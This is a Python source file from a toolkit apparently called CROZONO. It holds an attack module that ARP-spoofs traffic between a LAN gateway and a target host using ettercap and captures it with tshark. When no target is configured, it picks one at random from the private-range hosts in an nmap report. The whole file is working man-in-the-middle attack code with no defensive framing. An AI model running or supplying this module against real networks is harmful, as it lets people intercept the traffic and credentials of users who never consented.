#!/usr/bin/env python3
"""
--------------------------------------------------------------------------------
	CROZONO - 22.02.16.20.00.00 - www.crozono.com - info@crozono.com

	LAN attack module - Perform a sniffing with MITM attack
--------------------------------------------------------------------------------

"""
import os
import time
import random
import pexpect
import subprocess
import src.settings as settings

from poormanslogging import info, warn, error
from src.attacks.base_attack import BaseAttack

class sniffing_mitm(BaseAttack):

	def __init__(self, p):
		pass

	def run(self):
		info("Running a Sniffing and MITM attack between {g} and {m}...".format(g=settings.GATEWAY, m=settings.TARGET_MITM))
		cmd_ettercap = pexpect.spawn(
					'ettercap -T -M arp:remote /{g}/ /{m}/ -i {i}'.format(g=settings.GATEWAY, m=settings.TARGET_MITM, i=settings.INTERFACE))
		time.sleep(2)
		# cmd_tshark = pexpect.spawn('tshark -i {i} -w cr0z0n0_sniff'.format(i=settings.INTERFACE)) # backup (?)
		proc = subprocess.call(["tshark", "-i", settings.INTERFACE], stderr=subprocess.DEVNULL)

	def setup(self):
		# Get a MITM Target:
		if settings.TARGET_MITM is None:
			targets = []
			nmap_report = open(os.path.join(settings.OS_PATH,'cr0z0n0_nmap'), 'r')
			for line in nmap_report:
				if line.startswith('Nmap scan report for'):
					ip = line.split(" ")[-1]
					if ip.startswith(("192", "172", "10")) and ip != settings.GATEWAY and ip != settings.IP_LAN:
						targets.append(ip)
			settings.TARGET_MITM = random.choice(targets)
		else:
			pass

	def check(self):
		deps = ["ettercap","tshark"]
		for d in deps:
			if subprocess.call(["which", d],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
				error("Required binary for {bin} not found.".format(bin=d))
				return False
		if not os.path.exists(os.path.join(settings.OS_PATH,'cr0z0n0_nmap')):
			error("NMap scan is required for this LAN attack module!")
			return False
		return True